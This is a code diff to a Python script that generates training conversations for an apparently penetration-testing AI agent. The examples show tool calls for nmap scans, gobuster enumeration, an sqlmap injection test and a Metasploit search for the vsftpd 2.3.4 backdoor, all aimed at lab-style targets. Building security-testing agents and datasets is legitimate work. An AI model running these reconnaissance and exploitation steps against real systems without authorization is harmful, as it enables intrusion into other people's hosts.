@@ -46,7 +46,7 @@ def generate_recon_examples(attack_kb: AttackKnowledge) -> Generator[dict, None,
         "messages": [
             {"role": "system", "content": SYSTEM_PROMPT},
             {"role": "user", "content": "Scan 10.0.0.5 for open ports"},
-            {"role": "assistant", "content": None, "tool_calls": [
+            {"role": "assistant", "content": "", "tool_calls": [
                 {"type": "function", "function": {"name": "terminal", "arguments": json.dumps({"command": "nmap -sV -sC -oA loot/nmap_10.0.0.5 10.0.0.5"})}}
             ]},
             {"role": "tool", "content": "Starting Nmap...\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2\n80/tcp open  http    Apache 2.4.41\n..."},
@@ -59,7 +59,7 @@ def generate_recon_examples(attack_kb: AttackKnowledge) -> Generator[dict, None,
         "messages": [
             {"role": "system", "content": SYSTEM_PROMPT},
             {"role": "user", "content": "There's a web server on port 80, enumerate it"},
-            {"role": "assistant", "content": None, "tool_calls": [
+            {"role": "assistant", "content": "", "tool_calls": [
                 {"type": "function", "function": {"name": "terminal", "arguments": json.dumps({"command": "whatweb http://10.0.0.5 && gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -o loot/gobuster_10.0.0.5.txt"})}}
             ]},
             {"role": "tool", "content": "http://10.0.0.5 [200 OK] Apache[2.4.41], PHP[7.4.3], WordPress[5.7]\n/wp-admin (301)\n/wp-content (301)\n/wp-includes (301)"},
@@ -80,7 +80,7 @@ def generate_exploitation_examples(attack_kb: AttackKnowledge) -> Generator[dict
                 {"type": "function", "function": {"name": "ask_user", "arguments": json.dumps({"question": "Run SQLMap against http://target.htb/products.php?id=1? This sends many requests."})}}
             ]},
             {"role": "tool", "content": "yes"},
-            {"role": "assistant", "content": None, "tool_calls": [
+            {"role": "assistant", "content": "", "tool_calls": [
                 {"type": "function", "function": {"name": "terminal", "arguments": json.dumps({"command": "sqlmap -u 'http://target.htb/products.php?id=1' --batch --banner"})}}
             ]},
             {"role": "tool", "content": "[INFO] GET parameter 'id' is vulnerable. Type: boolean-based blind\n[INFO] the back-end DBMS is MySQL\n[INFO] banner: '8.0.23'"},
@@ -93,7 +93,7 @@ def generate_exploitation_examples(attack_kb: AttackKnowledge) -> Generator[dict
         "messages": [
             {"role": "system", "content": SYSTEM_PROMPT},
             {"role": "user", "content": "The target has vsftpd 2.3.4 on port 21"},
-            {"role": "assistant", "content": None, "tool_calls": [
+            {"role": "assistant", "content": "", "tool_calls": [
                 {"type": "function", "function": {"name": "msf_search", "arguments": json.dumps({"query": "vsftpd 2.3.4"})}}
             ]},
             {"role": "tool", "content": "[1] exploit/unix/ftp/vsftpd_234_backdoor - VSFTPD v2.3.4 Backdoor Command Execution (Excellent)"},
